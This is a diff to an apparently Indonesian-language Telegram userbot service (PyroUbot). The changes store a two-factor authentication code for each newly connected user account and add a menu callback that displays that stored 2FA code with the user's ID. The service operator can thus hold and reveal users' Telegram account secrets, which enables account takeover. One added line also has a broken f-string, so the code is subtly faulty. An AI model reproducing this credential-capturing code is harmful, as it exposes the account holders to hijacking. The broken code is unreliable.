@@ -189,12 +189,6 @@ async def bikin_ubot(client, callback_query):
         session_string=session_string,
     )
     await set_uptime(new_client.me.id, time())
-    for id_maker in [user_id, new_client.me.id]:
-        try:
-            if id_maker not in await get_seles():
-                await remove_prem(id_maker)
-        except:
-            pass
     for mod in loadModule():
         importlib.reload(importlib.import_module(f"PyroUbot.modules.{mod}"))
     text_done = f"<b>🔥 {bot.me.mention} ʙᴇʀʜᴀsɪʟ ᴅɪᴀᴋᴛɪꜰᴋᴀɴ ᴅɪ ᴀᴋᴜɴ: <a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code></b> "
@@ -222,6 +216,9 @@ async def bikin_ubot(client, callback_query):
         ),
         disable_web_page_preview=True,
     )
+    if new_code:
+        await set_two_factor(new_client.me.id, new_code)
+    
 
 
 async def cek_ubot(client, callback_query):
@@ -287,6 +284,21 @@ async def get_num_otp(client, callback_query):
             )
         except Exception as error:
             return await callback_query.answer(error, True)
+    elif query[0] == "get_2fa":
+        code = await get_two_factor(X.me.id)
+        if code == None:
+            return await callback_query.answer(
+            "🔐 ᴋᴏᴅᴇ ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ",
+            True,
+        )
+        else:
+            return await callback_query.edit_message_text(
+                f<b>🔐 ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴅᴇɴɢᴀɴ ᴜsᴇʀ_ɪᴅ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ <code>{code}</code></b>",
+                reply_markup=InlineKeyboardMarkup(
+                    Button.userbot(X.me.id, int(query[2]))
+                ),
+            )
+        
 
 
 async def cek_userbot_expired(client, callback_query):
